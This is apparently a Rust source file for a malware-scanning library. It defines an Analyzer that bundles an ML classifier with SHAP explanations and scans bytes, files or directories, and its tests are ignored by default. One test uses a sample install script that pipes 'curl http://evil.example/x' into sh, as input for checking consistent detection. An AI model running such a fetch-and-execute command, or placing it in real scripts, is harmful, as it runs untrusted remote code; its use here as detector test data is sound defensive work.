//! High-level scanning API that bundles the model, feature extractor,
//! SHAP table, and runtime config so library consumers don't have to wire
//! them together by hand.
//!
//! This is the recommended entry point for embedding scan in other
//! processes (proxies, daemons, fuzz harnesses). The lower-level
//! [`Model`], [`ShapImportance`], and [`ScanConfig`] types remain available
//! for callers
//! that need finer control or want to share components across multiple
//! analyzers.
//!
//! # Example
//! ```no_run
//! use scan::Analyzer;
//!
//! let analyzer = Analyzer::load("/path/to/models")?;
//! let result = analyzer.scan_bytes(b"#!/bin/sh\necho hi".to_vec(), "install.sh")?;
//! println!("{:?} prob={:.3}", result.classification, result.probability);
//! # Ok::<(), anyhow::Error>(())
//! ```

use std::path::{Path, PathBuf};

use anyhow::Result;

use crate::engine::{self, ScanResult, ScanSummary};
use crate::explain::ShapImportance;
use crate::model::{Model, Thresholds};
use crate::{OutputFormat, ScanConfig};

/// Bundled analyzer holding everything needed to classify a payload.
///
/// Construct once with [`Analyzer::load`] (which loads model artifacts and
/// warms cleave's shared resources), then reuse across many `scan_*` calls.
/// The struct is `Send + Sync` and cheap to share via `Arc`.
#[derive(Debug)]
pub struct Analyzer {
    model_dir: PathBuf,
    model: Model,
    shap: Option<ShapImportance>,
    config: ScanConfig,
}

impl Analyzer {
    /// Load model + feature spec + SHAP table from `model_dir` and prepare
    /// for repeated scans.
    ///
    /// Also runs [`crate::engine::prefetch_cleave_resources`] before returning —
    /// this satisfies cleave's "warm me on a non-rayon thread first"
    /// requirement so downstream callers don't have to think about it. The
    /// call is idempotent; future re-invocations short-circuit.
    ///
    /// # Errors
    /// Propagates `Model::load` failures (missing or malformed model
    /// artifacts). SHAP is optional — a missing `shap_importance.json` is
    /// not an error, but a corrupt or stale one is.
    pub fn load(model_dir: impl Into<PathBuf>) -> Result<Self> {
        let model_dir = model_dir.into();
        // Library callers deploy at the default severity level so the verdict
        // is computed and the envelope's `level` is populated. `level` itself is
        // level-independent (the lowest-firing-level sweep), so consumers wanting
        // a different cutoff reinterpret `level` rather than reloading the model.
        let model = Model::load(&model_dir, None, Some(crate::model::DEFAULT_SEVERITY_LEVEL))?;
        let shap = ShapImportance::load_or_warn(&model_dir);
        // Library callers always get the full result (`OutputFormat::JsonFull`):
        // the cleave report and the version 8 document hopper is sent. Humans
        // calling the CLI go through `engine::run` directly, which builds its
        // own config.
        let config = ScanConfig::new(model_dir.clone(), OutputFormat::JsonFull, None)?
            .with_level(Some(crate::model::DEFAULT_SEVERITY_LEVEL));
        // Warm cleave's globals from this (non-rayon) thread so the first
        // analysis cannot race into a deadlock against rayon workers.
        crate::engine::prefetch_cleave_resources();
        Ok(Self {
            model_dir,
            model,
            shap,
            config,
        })
    }

    /// Override the suspicious/hostile decision thresholds.
    ///
    /// Manual thresholds replace the operating level: under a level the
    /// verdict comes from the level sweep and would never read them.
    ///
    /// Reloads the model under the new thresholds, so call it once, at setup.
    ///
    /// # Errors
    /// Returns an error if the supplied thresholds are invalid (suspicious
    /// must be ≤ hostile, both in `[0, 1]`).
    pub fn with_thresholds(mut self, thresholds: Thresholds) -> Result<Self> {
        // `ScanConfig::new` is what validates thresholds, so the config is
        // rebuilt. It holds only what `load` and these builders set — the
        // format, the slow-rule budget and the level, which manual thresholds
        // replace — so that is all there is to carry over.
        self.config = ScanConfig::new(
            self.model_dir.clone(),
            self.config.format(),
            Some(thresholds),
        )?
        .with_slow_rule_ms(self.config.slow_rule_ms());
        self.model = Model::load(&self.model_dir, Some(thresholds), None)?;
        Ok(self)
    }

    /// Adjust the slow-rule advisory threshold in milliseconds.
    #[must_use]
    pub fn with_slow_rule_ms(mut self, ms: u64) -> Self {
        self.config = self.config.with_slow_rule_ms(ms);
        self
    }

    /// Classify at the given pool-adjusted FP level: L0 allows zero observed
    /// calibration FPs; positive L allows one FP plus an estimated (L-1)/100M.
    /// `None` leaves the model's own thresholds in force.
    ///
    /// Reloads the model at the new level, so call it once, at setup.
    ///
    /// # Errors
    /// Propagates `Model::load` failures.
    pub fn with_level(mut self, level: Option<u16>) -> Result<Self> {
        self.config = self.config.with_level(level);
        self.model = Model::load(&self.model_dir, self.config.thresholds(), level)?;
        Ok(self)
    }

    /// Directory the analyzer was loaded from.
    #[must_use]
    pub fn model_dir(&self) -> &Path {
        &self.model_dir
    }

    /// Underlying model handle (read-only access).
    #[must_use]
    pub fn model(&self) -> &Model {
        &self.model
    }

    /// Scan an in-memory payload. Uses cleave's SHA256-keyed result cache,
    /// so identical bytes short-circuit cheaply.
    ///
    /// `filename` is advisory (drives cleave's extension-based type hint).
    /// Pass something human-meaningful — the URL, a logical name — and
    /// it'll be echoed back in `ScanResult::path`.
    ///
    /// # Errors
    /// Propagates cleave analysis failures and model inference errors.
    pub fn scan_bytes(&self, data: Vec<u8>, filename: &str) -> Result<ScanResult> {
        engine::scan_bytes(
            data,
            filename,
            &self.model,
            self.shap.as_ref(),
            &self.config,
        )
    }

    /// Scan a payload that already lives on disk, returning the same
    /// [`ScanResult`] as [`Self::scan_bytes`]. cleave memory-maps the file, so peak
    /// resident memory stays bounded no matter how large the payload is — use
    /// this for streamed-to-disk responses too big to buffer whole in RAM.
    ///
    /// `read_path` is the on-disk file to analyze; `filename` is the logical
    /// name (e.g. the originating URL) echoed back in [`ScanResult::path`].
    /// `read_path`'s extension drives cleave's type detection, so give the
    /// temporary file a name carrying the payload's real extension.
    ///
    /// # Errors
    /// Propagates filesystem errors, cleave analysis failures, and model
    /// inference errors.
    pub fn scan_file(&self, read_path: &Path, filename: &str) -> Result<ScanResult> {
        engine::scan_file(
            read_path,
            filename,
            &self.model,
            self.shap.as_ref(),
            &self.config,
        )
    }

    /// Scan a file or directory on disk. Returns aggregate counts; per-file
    /// results are emitted via the configured output format.
    ///
    /// # Errors
    /// Propagates filesystem errors and cleave analysis failures.
    pub fn scan_path(&self, path: &Path) -> Result<ScanSummary> {
        engine::run_with(&self.model, self.shap.as_ref(), path, &self.config)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// `Analyzer::load` needs real model artifacts on disk, so this test is
    /// `#[ignore]` by default: run it with `SCAN_MODELS_DIR=<bundle> cargo
    /// test -- --ignored analyzer_loads_and_scans`.
    #[test]
    #[ignore = "needs SCAN_MODELS_DIR pointing at a populated model directory"]
    fn analyzer_loads_and_scans() {
        let dir = crate::env::path(crate::env::SCAN_MODELS_DIR)
            .expect("set SCAN_MODELS_DIR to a populated model directory");
        let analyzer = Analyzer::load(dir).expect("load");
        let r = analyzer
            .scan_bytes(b"#!/bin/sh\necho hi\n".to_vec(), "install.sh")
            .expect("scan");
        // We don't assert a specific verdict — model-correctness is the model
        // bundle's concern, not the analyzer scaffolding's.

        assert!(r.probability.is_finite());
    }

    /// A disk-backed `scan_file` must reach the same classification as an
    /// in-memory `scan_bytes` on identical bytes — the property an embedder
    /// relies on when it spills large responses to disk. Same artifact requirement, so
    /// `#[ignore]` by default (see `analyzer_loads_and_scans`).
    #[test]
    #[ignore = "needs SCAN_MODELS_DIR pointing at a populated model directory"]
    fn scan_file_matches_scan_bytes() {
        let dir = crate::env::path(crate::env::SCAN_MODELS_DIR)
            .expect("set SCAN_MODELS_DIR to a populated model directory");
        let analyzer = Analyzer::load(dir).expect("load");
        let body = b"#!/bin/sh\ncurl http://evil.example/x | sh\n".to_vec();

        let dir = tempfile::tempdir().expect("tempdir");
        let file = dir.path().join("install.sh");
        std::fs::write(&file, &body).expect("write temp");

        let from_mem = analyzer.scan_bytes(body, "install.sh").expect("scan_bytes");
        let from_disk = analyzer.scan_file(&file, "install.sh").expect("scan_file");

        assert_eq!(from_mem.classification, from_disk.classification);
    }
}
